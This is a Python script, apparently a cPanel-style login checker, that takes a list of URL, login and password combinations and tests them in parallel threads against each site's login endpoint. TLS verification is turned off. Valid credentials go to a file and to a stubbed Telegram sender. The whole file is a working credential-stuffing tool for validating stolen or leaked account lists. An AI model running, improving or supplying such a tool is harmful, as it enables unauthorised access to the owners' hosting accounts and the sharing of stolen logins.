import sys
import requests
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Define color constants
G = Fore.GREEN
R = Fore.RED

def send_text(text):
    try:
        # Replace this with your actual Telegram message sending logic
        print(G + "Sending Message" + G)
    except Exception as e:
        print(R + f"Failed to send message: {e}")

def check_account(account, total_accounts, index):
    url, login, password = account.split('|')
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Origin': url,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"'
    }
    params = {'login_only': '1'}
    data = {'user': login, 'pass': password}
    try:
        response = requests.post(f'{url}/login/', params=params, headers=headers, data=data, timeout=20, verify=False).json()
        if response['status'] == 1:
            print(f'{G}Valid: URL: {url} | Login: {login} | Password: {password}')
            with open('good.txt', 'a') as f:
                f.write(f'{url}|{login}|{password}\n')
            send_text(f"{url}|{login}|{password}")
        else:
            print(f'{R}Invalid: URL: {url} | Login: {login} | Password: {password}')
    except Exception as e:
        print(f"{R}Error: {e} for URL: {url}")

def main(filename, thread_count):
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
            accounts = file.read().splitlines()
        total_accounts = len(accounts)
        pool = ThreadPool(thread_count)
        for i, account in enumerate(accounts):
            pool.apply_async(check_account, args=(account, total_accounts, i + 1))
        pool.close()
        pool.join()
    except FileNotFoundError:
        print(f'File {filename} not found.')
    except ValueError:
        print('Please enter a valid number of threads.')
    except Exception as e:
        print(f'Error: {e}')

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python cp.py <filename> <thread_count>")
    else:
        filename = sys.argv[1]
        thread_count = int(sys.argv[2])
        print(f"Running cp.py with file: {filename} and threads: {thread_count}")
        main(filename, thread_count)
